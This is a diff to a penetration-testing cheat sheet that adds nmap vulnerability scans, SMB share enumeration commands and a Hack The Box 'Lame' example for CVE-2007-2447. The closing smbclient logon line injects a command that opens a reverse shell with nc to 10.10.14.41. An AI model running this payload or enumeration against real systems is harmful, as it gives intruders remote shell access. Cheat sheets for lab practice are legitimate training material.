@@ -21,6 +21,7 @@
 19. [RSA](#rsa)
 20. [SSL](#ssl)
 21. [Shell Shock](#shell-shock)
+22. [SMB](#smb)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -69,6 +70,9 @@ sudo -u scriptmanager bash -i
 ``` bash
 nmap -sC -sV -oA outfile 192.168.1.0/24
 ```
+nmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3
+nmap -T4 -Pn -p- <TARGET> -o tmp.nmap > /dev/null
+nmap -sC -sV -o portscan.nmap -p $(cat tmp.nmap | grep open | cut -d\t -f1 | sed 's/\///g' | paste -sd, ) <TARGET> > /dev/null
 
 ```bash
 for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -p$i -A 192.168.67.133; done
@@ -823,6 +827,33 @@ Just an uptime test script
 ```
 
 
+# SMB
+## /etc/samba/smb.conf
+Add the following to the global section 
+```
+client min protocol = CORE
+client max protocol = SMB3
+```
+
+## List shares
+```
+smbclient -L \\10.10.10.3\
+smbmap -H 10.10.10.3
+```
+
+## Connect to share
+```
+smbclient \\\\10.10.10.3\\sharename
+smbclient //10.10.10.3/tmp # different syntax 
+smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1' # for using insecure protocol if negotiation failed
+```
+
+## CVE-2007-2447 (smb usermap script)
+### Example from Lame (HTB)
+```
+smbclient //10.10.10.3/tmp
+smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manununu | /bin/sh >/tmp/manununu 2>&1; rm /tmp/manununu`"
+```
 
 
 
